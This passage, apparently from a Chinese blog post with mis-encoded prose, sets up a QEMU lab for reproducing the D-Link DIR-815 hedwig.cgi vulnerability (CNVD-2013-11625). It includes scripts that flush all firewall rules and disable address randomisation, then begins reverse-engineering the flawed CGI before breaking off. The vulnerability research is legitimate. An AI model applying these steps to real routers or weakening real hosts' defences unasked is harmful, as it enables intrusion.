  <span class="token parameter variable">-nographic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯åŠ¨æˆåŠŸï¼Œè´¦å·å¯†ç éƒ½æ˜¯ <code>root</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B04.png" alt="CNVD-2013-11625å¤ç°4.png"></p><p>æ¥ä¸‹æ¥é…ç½®è™šæ‹Ÿç½‘å¡ï¼Œåœ¨ Kali Linux ä¸­åˆ›å»ºä¸€ä¸ª <code>net.sh</code> è„šæœ¬ï¼Œå¹¶å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token function">sudo</span> brctl addbr br0                   <span class="token comment"># æ·»åŠ ä¸€åº§åä¸º br0 çš„ç½‘æ¡¥</span>
<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 <span class="token number">192.168</span>.2.3/24 up    <span class="token comment"># å¯ç”¨ br0 æ¥å£</span>
<span class="token function">sudo</span> tunctl <span class="token parameter variable">-t</span> tap0 <span class="token parameter variable">-u</span> root            <span class="token comment"># åˆ›å»ºä¸€ä¸ªåªè®¸ root è®¿é—®çš„ tap0 æ¥å£</span>
<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 <span class="token number">192.168</span>.2.1/24 up   <span class="token comment"># å¯ç”¨ tap0 æ¥å£</span>
<span class="token function">sudo</span> brctl addif br0 tap0              <span class="token comment"># åœ¨è™šæ‹Ÿç½‘æ¡¥ä¸­å¢åŠ ä¸€ä¸ª tap0 æ¥å£</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>èµ‹äºˆæ‰§è¡Œæƒé™å¹¶è¿è¡Œè¯¥è„šæœ¬ï¼šï¼ˆ<em>æ¯æ¬¡é‡å¯ Kali Linux åéƒ½éœ€è¦é‡æ–°é…ç½®ä¸€æ¬¡</em>ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> +x net.sh
./net.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åœ¨ QEMU è™šæ‹Ÿæœºä¸­è®¾ç½® ip åœ°å€ï¼Œ<strong>æ³¨æ„ä¸Â <code>tap0</code>Â åœ¨åŒä¸€ç½‘æ®µ</strong>ï¼šï¼ˆ<em>æ¯æ¬¡é‡å¯ QEMU è™šæ‹Ÿæœºåéƒ½éœ€è¦é‡æ–°é…ç½®ä¸€æ¬¡</em>ï¼‰</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>root@debian-mipsel<span class="token punctuation">)</span> <span class="token function">ifconfig</span> eth0 <span class="token number">192.168</span>.2.2/24 up<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é…ç½®å QEMU è™šæ‹Ÿæœºçš„ ip åœ°å€ä¸º <code>192.168.2.2</code>ï¼Œæµ‹è¯•ä¸€ä¸‹èƒ½å¦ä¸ Kali Linux çš„ <code>192.168.2.1</code> ç›¸äº’ ping é€šï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B05.png" alt="CNVD-2013-11625å¤ç°5.png"></p><p>å°†æ–‡ä»¶ç³»ç»Ÿæ‰“åŒ…å¹¶é€šè¿‡ <code>scp</code> å‘½ä»¤ä¸Šä¼ åˆ° QEMU è™šæ‹Ÿæœºï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-czvf</span> DIR-815A1_FW101SSB03_rootfs.tar.gz squashfs-root
<span class="token function">sudo</span> <span class="token function">scp</span> DIR-815A1_FW101SSB03_rootfs.tar.gz root@192.168.2.2:~/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B06.png" alt="CNVD-2013-11625å¤ç°6.png"></p><p>å¦‚æœ <code>scp</code> å‘½ä»¤æŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Unable to negotiate with <span class="token number">192.168</span>.2.2 port <span class="token number">22</span>: no matching <span class="token function">host</span> key <span class="token builtin class-name">type</span> found. Their offer: ssh-rsa,ssh-dss
scp: Connection closed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>è¿™è¡¨ç¤º SSH å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´æ²¡æœ‰åŒ¹é…çš„ä¸»æœºå¯†é’¥ç±»å‹ï¼Œé€šå¸¸æ˜¯å› ä¸ºæœåŠ¡å™¨åªæ”¯æŒæ—§çš„ <code>ssh-rsa</code> å’Œ <code>ssh-dss</code> å¯†é’¥ç±»å‹ï¼Œè€Œ SSH å®¢æˆ·ç«¯é…ç½®ä¸å†æ¥å—è¿™äº›ç±»å‹çš„å¯†é’¥</p></blockquote><p>æ”¹ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-o</span> <span class="token assign-left variable">HostKeyAlgorithms</span><span class="token operator">=</span>+ssh-rsa DIR-815A1_FW101SSB03_rootfs.tar.gz root@192.168.2.2:~/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœç»§ç»­æŠ¥é”™ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED<span class="token operator">!</span>     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY<span class="token operator">!</span>
Someone could be eavesdropping on you right now <span class="token punctuation">(</span>man-in-the-middle attack<span class="token punctuation">)</span><span class="token operator">!</span>
It is also possible that a <span class="token function">host</span> key has just been changed.
The fingerprint <span class="token keyword">for</span> the RSA key sent by the remote <span class="token function">host</span> is
SHA256:tVc2ekHlAJNyIu0Fo9rOvfudWIVfkMpa3FSLlDcGeVQ.
Please contact your system administrator.
Add correct <span class="token function">host</span> key <span class="token keyword">in</span> /root/.ssh/known_hosts to get rid of this message.
Offending ECDSA key <span class="token keyword">in</span> /root/.ssh/known_hosts:1
  remove with:
  ssh-keygen <span class="token parameter variable">-f</span> <span class="token string">'/root/.ssh/known_hosts'</span> <span class="token parameter variable">-R</span> <span class="token string">'192.168.2.2'</span>
Host key <span class="token keyword">for</span> <span class="token number">192.168</span>.2.2 has changed and you have requested strict checking.
Host key verification failed.
scp: Connection closed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å³å¯è§£å†³ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> ssh-keygen <span class="token parameter variable">-R</span> <span class="token number">192.168</span>.2.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B07.png" alt="CNVD-2013-11625å¤ç°7.png"></p><p>åœ¨ QEMU è™šæ‹Ÿæœºä¸­è§£å‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>root@debian-mipsel<span class="token punctuation">)</span> <span class="token function">tar</span> <span class="token parameter variable">-xzvf</span> DIR-815A1_FW101SSB03_rootfs.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿›å…¥åˆ°è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ï¼Œæ–°å»ºä¸€ä¸ª HTTP æœåŠ¡çš„é…ç½®æ–‡ä»¶ <code>http_conf</code>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> squashfs-root
<span class="token comment"># å› ä¸º QEMU è™šæ‹Ÿæœºä¸­æ²¡æœ‰ vi å’Œ vim ç­‰ï¼Œä½†å¯ä»¥ä½¿ç”¨ nanoï¼Œè¿™é‡Œä»¥ cat ä½œä¸ºç¤ºä¾‹ï¼Œcat > å‘½ä»¤ä½¿ç”¨ ctrl + D ä¿å­˜å¹¶é€€å‡º</span>
<span class="token function">cat</span> <span class="token operator">></span> http_conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Umask 026
PIDFile /var/run/httpd.pid
LogGMT On   <span class="token comment"># å¼€å¯ log</span>
ErrorLog /log   <span class="token comment"># log æ–‡ä»¶</span>

Tuning <span class="token punctuation">&#123;</span>
    NumConnections <span class="token number">15</span>
    BufSize <span class="token number">12288</span>
    InputBufSize <span class="token number">4096</span>
    ScriptBufSize <span class="token number">4096</span>
    NumHeaders <span class="token number">100</span>
    Timeout <span class="token number">60</span>
    ScriptTimeout <span class="token number">60</span>
<span class="token punctuation">&#125;</span>

Control <span class="token punctuation">&#123;</span>
    Types <span class="token punctuation">&#123;</span>
        text/html <span class="token punctuation">&#123;</span> html htm <span class="token punctuation">&#125;</span>
        text/xml <span class="token punctuation">&#123;</span> xml <span class="token punctuation">&#125;</span>
        text/plain <span class="token punctuation">&#123;</span> txt <span class="token punctuation">&#125;</span>
        image/gif <span class="token punctuation">&#123;</span> gif <span class="token punctuation">&#125;</span>
        image/jpeg <span class="token punctuation">&#123;</span> jpg <span class="token punctuation">&#125;</span>
        text/css <span class="token punctuation">&#123;</span> css <span class="token punctuation">&#125;</span>
        application/octet-stream <span class="token punctuation">&#123;</span> * <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    Specials <span class="token punctuation">&#123;</span>
        Dump <span class="token punctuation">&#123;</span> /dump <span class="token punctuation">&#125;</span>
        CGI <span class="token punctuation">&#123;</span> cgi <span class="token punctuation">&#125;</span>
        Imagemap <span class="token punctuation">&#123;</span> map <span class="token punctuation">&#125;</span>
        Redirect <span class="token punctuation">&#123;</span> url <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    External <span class="token punctuation">&#123;</span>
        /usr/sbin/phpcgi <span class="token punctuation">&#123;</span> php <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

Server <span class="token punctuation">&#123;</span>
    ServerName <span class="token string">"Linux, HTTP/1.1, "</span>
    ServerId <span class="token string">"1234"</span>
    Family inet
    Interface eth0         <span class="token comment"># ç½‘å¡</span>
    Address <span class="token number">192.168</span>.2.2    <span class="token comment"># qemu çš„ ip åœ°å€</span>
    Port <span class="token string">"4321"</span>            <span class="token comment"># å¯¹åº” web è®¿é—®ç«¯å£</span>
    Virtual <span class="token punctuation">&#123;</span>
        AnyHost
        Control <span class="token punctuation">&#123;</span>
            Alias /
            Location /htdocs/web
            IndexNames <span class="token punctuation">&#123;</span> index.php <span class="token punctuation">&#125;</span>
            External <span class="token punctuation">&#123;</span>
                /usr/sbin/phpcgi <span class="token punctuation">&#123;</span> router_info.xml <span class="token punctuation">&#125;</span>
                /usr/sbin/phpcgi <span class="token punctuation">&#123;</span> post_login.xml <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        Control <span class="token punctuation">&#123;</span>
            Alias /HNAP1
            Location /htdocs/HNAP1
            External <span class="token punctuation">&#123;</span>
                /usr/sbin/hnap <span class="token punctuation">&#123;</span> hnap <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            IndexNames <span class="token punctuation">&#123;</span> index.hnap <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ Kali Linux ç‰©ç†æœºä¸­æ–°å»ºä¸€ä¸ªè„šæœ¬ <code>forwarding.sh</code>ï¼Œç”¨äºå¼€å¯ç‰©ç†æœºçš„ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰å’Œ IP è½¬å‘ï¼ˆ<strong>é˜²æ­¢åç»­åœ¨ <code>init.sh</code> è„šæœ¬ä¸­å¯åŠ¨ <code>httpd</code> æœåŠ¡æ—¶å‡ºç°é—®é¢˜</strong>ï¼‰ï¼Œå†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token function">sudo</span> <span class="token function">sysctl</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">net.ipv4.ip_forward</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-F</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-X</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-F</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-X</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> mangle <span class="token parameter variable">-F</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> mangle <span class="token parameter variable">-X</span>
<span class="token function">sudo</span> iptables <span class="token parameter variable">-P</span> INPUT ACCEPT
<span class="token function">sudo</span> iptables <span class="token parameter variable">-P</span> FORWARD ACCEPT
<span class="token function">sudo</span> iptables <span class="token parameter variable">-P</span> OUTPUT ACCEPT
<span class="token function">sudo</span> iptables <span class="token parameter variable">-t</span> nat <span class="token parameter variable">-A</span> POSTROUTING <span class="token parameter variable">-o</span> eth0 <span class="token parameter variable">-j</span> MASQUERADE
<span class="token function">sudo</span> iptables <span class="token parameter variable">-I</span> FORWARD <span class="token number">1</span> <span class="token parameter variable">-i</span> tap0 <span class="token parameter variable">-j</span> ACCEPT
<span class="token function">sudo</span> iptables <span class="token parameter variable">-I</span> FORWARD <span class="token number">1</span> <span class="token parameter variable">-o</span> tap0 <span class="token parameter variable">-m</span> state <span class="token parameter variable">--state</span> RELATED,ESTABLISHED <span class="token parameter variable">-j</span> ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ Kali Linux ä¸­æ‰§è¡Œè¯¥è„šæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> +x forwarding.sh
./forwarding.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç´§æ¥ç€ï¼Œåœ¨è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ä¸‹ï¼Œç»§ç»­æ–°å»ºä¸€ä¸ª <code>init.sh</code> è„šæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> squashfs-root
<span class="token comment"># å› ä¸º QEMU è™šæ‹Ÿæœºä¸­æ²¡æœ‰ vi å’Œ vim ç­‰ï¼Œä½†å¯ä»¥ä½¿ç”¨ nanoï¼Œè¿™é‡Œä»¥ cat ä½œä¸ºç¤ºä¾‹ï¼Œcat > å‘½ä»¤ä½¿ç”¨ ctrl + D ä¿å­˜å¹¶é€€å‡º</span>
<span class="token function">cat</span> <span class="token operator">></span> init.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token comment"># ç”±äºçœŸæœºä¸å­˜åœ¨åœ°å€éšæœºåŒ–ï¼Œå› æ­¤è¿™é‡Œå…³é—­åœ°å€éšæœºåŒ–</span>
<span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">></span> /proc/sys/kernel/randomize_va_space

<span class="token comment"># å¤åˆ¶é…ç½®å’ŒäºŒè¿›åˆ¶æ–‡ä»¶</span>
<span class="token function">cp</span> http_conf /
<span class="token function">cp</span> sbin/httpd /
<span class="token function">cp</span> <span class="token parameter variable">-rf</span> htdocs/ /

<span class="token comment"># å¤‡ä»½ /etcï¼Œé˜²æ­¢åç»­æ“ä½œæ”¹å˜ /etc æ–‡ä»¶å¤¹ä¸­çš„å†…å®¹å¯¼è‡´ä¸‹ä¸€æ¬¡å¯åŠ¨ QEMU è™šæ‹Ÿæœºå‡ºç°é—®é¢˜</span>
<span class="token function">mkdir</span> /etc_bak
<span class="token function">cp</span> <span class="token parameter variable">-r</span> /etc /etc_bak
<span class="token function">rm</span> /etc/services
<span class="token function">cp</span> <span class="token parameter variable">-rf</span> etc/ /

<span class="token comment"># å¤åˆ¶å¿…è¦çš„åº“</span>
<span class="token function">cp</span> lib/ld-uClibc-0.9.30.1.so /lib/
<span class="token function">cp</span> lib/libcrypt-0.9.30.1.so /lib/
<span class="token function">cp</span> lib/libc.so.0 /lib/
<span class="token function">cp</span> lib/libgcc_s.so.1 /lib/
<span class="token function">cp</span> lib/ld-uClibc.so.0 /lib/
<span class="token function">cp</span> lib/libcrypt.so.0 /lib/
<span class="token function">cp</span> lib/libgcc_s.so /lib/
<span class="token function">cp</span> lib/libuClibc-0.9.30.1.so /lib/

<span class="token comment"># åˆ é™¤æ—§çš„ CGI è„šæœ¬</span>
<span class="token builtin class-name">cd</span> /
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /htdocs/web/hedwig.cgi
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/sbin/phpcgi
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /usr/sbin/hnap

<span class="token comment"># åˆ›å»ºç¬¦å·é“¾æ¥</span>
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /htdocs/cgibin /htdocs/web/hedwig.cgi
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /htdocs/cgibin /usr/sbin/phpcgi
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /htdocs/cgibin /usr/sbin/hnap

<span class="token comment"># æ ¹æ®å‰é¢é…ç½®çš„ http_conf æ–‡ä»¶ï¼Œå¯åŠ¨ HTTP æœåŠ¡</span>
./httpd <span class="token parameter variable">-f</span> http_conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>èµ‹äºˆ <code>init.sh</code> æ‰§è¡Œæƒé™ï¼Œå¹¶è¿è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x init.sh
./init.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B08.png" alt="CNVD-2013-11625å¤ç°8.png"></p><p>è®¿é—® <code>http://192.168.2.2:4321/hedwig.cgi</code>ï¼Œç¡®è®¤ HTTP æœåŠ¡å·²ç»å¼€å¯ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B09.png" alt="CNVD-2013-11625å¤ç°9.png"></p><p>ç›´æ¥æµè§ˆå™¨è®¿é—®æç¤ºä¸æ”¯æŒçš„ HTTP è¯·æ±‚ï¼š<code>&quot;unsupported HTTP request&quot;</code></p><p><strong>æœ€åï¼Œåœ¨é€€å‡º QEMU è™šæ‹Ÿæœºä¹‹å‰ï¼Œè®°å¾—å…ˆåˆ›å»ºä¸€ä¸ª <code>fin.sh</code> è„šæœ¬</strong>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> squashfs-root
<span class="token function">cat</span> <span class="token operator">></span> fin.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å†™å…¥å¦‚ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc
<span class="token function">mv</span> /etc_bak/etc /etc
<span class="token function">rm</span> <span class="token parameter variable">-rf</span> /etc_bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ¯æ¬¡é€€å‡º QEMU è™šæ‹Ÿæœºå™¨ä¹‹å‰ï¼Œéƒ½æ‰§è¡Œä¸€ä¸‹ <code>fin.sh</code> è„šæœ¬ï¼Œæ¢å¤åˆšåˆš <code>init.sh</code> è„šæœ¬ä¸­æ›´æ”¹è¿‡çš„ <code>/etc</code> æ–‡ä»¶å¤¹ï¼Œé¿å…ä¸‹ä¸€æ¬¡å¯åŠ¨ QEMU æ—¶å‡ºç°é—®é¢˜ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x fin.sh
./fin.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B028.png" alt="CNVD-2013-11625å¤ç°28.png"></p><hr><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p>åœ¨è·¯ç”±å™¨æ–‡ä»¶ç³»ç»Ÿä¸­æ‰¾åˆ°æ¼æ´æ–‡ä»¶ <code>hedwig.cgi</code>ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> ./ <span class="token parameter variable">-name</span> hedwig.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B010.png" alt="CNVD-2013-11625å¤ç°10.png"></p><p>å‘ç° <code>hedwig.cgi</code> æ˜¯ä¸€ä¸ªè½¯é“¾æ¥ï¼ŒæŒ‡å‘ <code>cgibin</code> æ–‡ä»¶</p><p>åœ¨ IDA ä¸‹åˆ†æ <code>cgibin</code> æ–‡ä»¶ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B011.png" alt="CNVD-2013-11625å¤ç°11.png"></p><p>å®šä½åˆ°æ¼æ´æ¨¡å— <code>hedwigcgi_main()</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B012.png" alt="CNVD-2013-11625å¤ç°12.png"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åˆšåˆšè®¿é—® <code>http://192.168.2.2:4321/hedwig.cgi</code> æ—¶çš„æŠ¥é”™å†…å®¹ï¼š<code>&quot;unsupported HTTP request&quot;</code></p><p>åˆ†æå¯çŸ¥ï¼Œå…¶ä¼šè¯»å–å¹¶åˆ¤æ–­ç¯å¢ƒå˜é‡ <code>REQUEST_METHOD</code> æ˜¯å¦ä¸º POSTï¼Œå› æ­¤åªæ”¯æŒ POST è¯·æ±‚æ–¹å¼ï¼Œåˆšåˆšé€šè¿‡æµè§ˆå™¨è®¿é—®æ˜¯ GET æ–¹å¼ï¼Œæ‰€ä»¥æŠ¥é”™</p><p>æ¥ä¸‹æ¥ä¼šæ‰§è¡Œ <code>cgibin_parse_request(sub_409A6C, 0, 0x20000)</code>ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B013.png" alt="CNVD-2013-11625å¤ç°13.png"></p><p>è¿™ä¸ªå‡½æ•°ä½¿ç”¨åˆ°äº† 3 ä¸ªç¯å¢ƒå˜é‡ï¼š<code>CONTENT_TYPE</code>ã€<code>CONTENT_LENGTH</code>ã€<code>REQUEST_URI</code>ï¼Œæ‰€ä»¥åé¢è¿™ä¸‰ä¸ªç¯å¢ƒå˜é‡æˆ‘ä»¬æ˜¯å¿…é¡»è¦è®¾ç½®çš„</p><p>æ€»çš„æ¥è¯´ï¼Œ<code>cgibin_parse_request()</code> å‡½æ•°ä¸»è¦æ˜¯å¯¹ URL è¿›è¡Œåˆ†æå’Œå¤„ç†ï¼Œè¿™é‡Œåˆ†æä¸€ä¸‹ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B014.png" alt="CNVD-2013-11625å¤ç°14.png"></p><p>è¿™é‡Œå®šä½åˆ° URL ä¸­ç¬¬ä¸€ä¸ª <code>&#39;?&#39;</code> æ‰€åœ¨çš„ä½ç½®ï¼Œå¯¹å­—ç¬¦ä¸²è¿›è¡Œåˆ†å‰²ï¼Œå¹¶å°† <code>&#39;?&#39;</code> åçš„å†…å®¹å’Œé•¿åº¦ä¼ å…¥ <code>sub_402B40()</code> å‡½æ•°è¿›è¡Œå¤„ç†ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B015.png" alt="CNVD-2013-11625å¤ç°15.png"></p><p>è¿™é‡Œä¼šå†æ¬¡å¯¹å­—ç¬¦ä¸²ä»¥ <code>&#39;&amp;&#39;</code> å’Œ <code>&#39;=&#39;</code> è¿›è¡Œåˆ†å‰²ï¼Œå³ URL æ ¼å¼å¤§è‡´ä¸ºï¼š<code>aaa?bbb=ccc&amp;ddd</code></p><p><code>hedwigcgi_main()</code> ä¸­å†å¾€ä¸‹èµ°åˆ° <code>sess_get_uid(v4)</code></p><p><code>sess_get_uid()</code> å‡½æ•°ç”¨äºä» HTTP è¯·æ±‚çš„ Cookie ä¸­æå–ç”¨æˆ·çš„ <code>uid</code>ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ° <code>uid</code>ï¼Œåˆ™è¿”å›ç”¨æˆ·çš„è¿œç¨‹åœ°å€ï¼š</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="http://img.uf4te.cn/CNVD-2013-11625%E5%A4%8D%E7%8E%B016.png" alt="CNVD-2013-11625å¤ç°16.png"></p><p>å…¶åˆ¤æ–­ <code>uid</code> çš„é€»è¾‘ä¸ºï¼šä»¥ <code>&#39;=&#39;</code> ä½œä¸ºåˆ†éš”ï¼Œ<code>&#39;=&#39;</code> å‰é¢çš„å†…å®¹å­˜å…¥ <code>v2</code>ï¼Œ<code>&#39;=&#39;</code> åé¢çš„å†…å®¹å­˜å…¥ 